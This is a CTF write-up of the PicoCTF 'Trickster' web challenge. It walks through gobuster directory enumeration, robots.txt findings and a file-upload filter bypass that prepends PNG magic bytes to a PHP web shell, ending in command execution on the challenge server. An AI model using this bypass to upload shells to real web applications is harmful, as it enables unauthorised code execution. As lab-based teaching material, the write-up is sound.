---
title: PicoCTF Trickster
date: 2024-11-26 01:56:19 
categories: [CTF, Cybersecurity, Web Application Pentesting, Pentesting]
tags:
  [PicoCTF, Trickster, Web App Pentesting, File Signature, File Upload Vulnerability, RCE]
---

## Trickster

Author: Junias Bonou

Description
	I found a web app that can help process images: PNG images only! Try it here!


![https://joonkim0625.github.io/images/picoctf-trickster/picoctf-trickster.png](https://joonkim0625.github.io/images/picoctf-trickster.png)

When I attempted to upload some random files, I got the following error message:

	Error: File name does not contain '.png'.

This suggests that the app strictly checks for .png extensions. To dig deeper, we can perform a directory search to see if we can find anything useful. A tool like gobuster is perfect for this kind of task.

Here’s the command I used:

```
gobuster dir -u http://atlas.picoctf.net:60047 -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://atlas.picoctf.net:60047
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 285]
/.htpasswd            (Status: 403) [Size: 285]
/.htaccess            (Status: 403) [Size: 285]
/index.php            (Status: 200) [Size: 321]
/robots.txt           (Status: 200) [Size: 62]
/server-status        (Status: 403) [Size: 285]
/uploads              (Status: 301) [Size: 333] [--> http://atlas.picoctf.net:60047/uploads/]                                                             
Progress: 4734 / 4735 (99.98%)
```

For this type of challenge, the common.txt wordlist should be sufficient. From the output, we can see the existence of the robots.txt file and an uploads directory.

Contents of `robots.txt`:

```
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```

The Disallow directive means these pages should not be crawled by web crawlers, but we can still access them manually.

Contents of `instructions.txt`:

```
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.

```

Based on this, if we can create a script with the correct PNG magic bytes, we might be able to upload and execute it.

---

## Creating a Script with PNG Magic Bytes:

I modified these two lines from https://gist.github.com/Techbrunch/56415c360daf4d039975267586c45d8c:

```
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r >> shell.php.png
cat shell.php >> shell.php.png
```

The key here is to write the magic bytes first, followed by the code you want to execute.

---


## Uploading the Script

I uploaded the file shell.php.png.

![file upload](https://joonkim0625.github.io/images/picoctf-trickster/picoctf-trickster-upload-file.png)

However, I encountered an error:

![error](https://joonkim0625.github.io/images/picoctf-trickster/picoctf-trickster-error.png)

After troubleshooting, I realized my mistake: I named the file shell.php.png. Because of the .png extension, the app treated it as an image file rather than a script. This caused an error instead of executing the code.

Once I renamed the file and corrected the mistake, I successfully executed the command whoami.

![flag](https://joonkim0625.github.io/images/picoctf-trickster/picoctf-trickster-ws-working.png)

From here, a bit of lateral movement helped me locate the flag. Happy hacking!





